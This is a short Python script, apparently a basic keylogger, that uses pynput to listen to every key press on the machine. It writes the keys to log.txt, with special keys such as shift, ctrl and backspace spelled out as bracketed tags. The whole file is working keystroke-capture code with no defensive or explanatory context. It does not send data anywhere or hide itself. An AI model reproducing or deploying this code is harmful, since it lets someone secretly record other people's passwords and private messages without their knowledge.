from pynput.mouse import Listener as MouseListener, Controller as MouseController
from pynput.keyboard import Key, Listener as KeyboardListener, Controller as KeyboardController

def writetofile(key):
    letter = str(key).replace("'", "")

    key_mappings = {
        'Key.space': " ",
        'Key.enter': "\n",
        'Key.shift': " [shift] ",
        'Key.shift_l': " [left shift] ",
        'Key.shift_r': " [right shift] ",
        'Key.ctrl': " [ctrl] ",
        'Key.ctrl_l': " [left ctrl] ",
        'Key.ctrl_r': " [right ctrl] ",
        'Key.alt': " [alt] ",
        'Key.alt_l': " [left alt] ",
        'Key.alt_r': " [right alt] ",
        'Key.alt_gr': " [alt gr] ",
        'Key.cmd': " [cmd] ",
        'Key.cmd_l': " [left cmd] ",
        'Key.cmd_r': " [right cmd] ",
        'Key.backspace': " [backspace] ",
        'Key.caps_lock': " [caps lock] ",
        'Key.delete': " [delete] ",
        'Key.down': " [down arrow] ",
        'Key.up': " [up arrow] ",
        'Key.left': " [left arrow] ",
        'Key.right': " [right arrow] ",
        'Key.end': " [end] ",
        'Key.esc': " [esc] ",
        'Key.f1': " [f1] ",
        'Key.home': " [home] ",
        'Key.insert': " [insert] ",
        'Key.menu': " [menu] ",
        'Key.num_lock': " [num lock] ",
        'Key.page_down': " [page down] ",
        'Key.page_up': " [page up] ",
        'Key.pause': " [pause/break] ",
        'Key.print_screen': " [print screen] ",
        'Key.scroll_lock': " [scroll lock] ",
        'Key.tab': " [tab] "
    }

    if letter in key_mappings:
        letter = key_mappings[letter]

    with open("log.txt", 'a') as f:
        f.write(letter)

with KeyboardListener(on_press=writetofile) as listener: #here listener is the variable 
    listener.join()

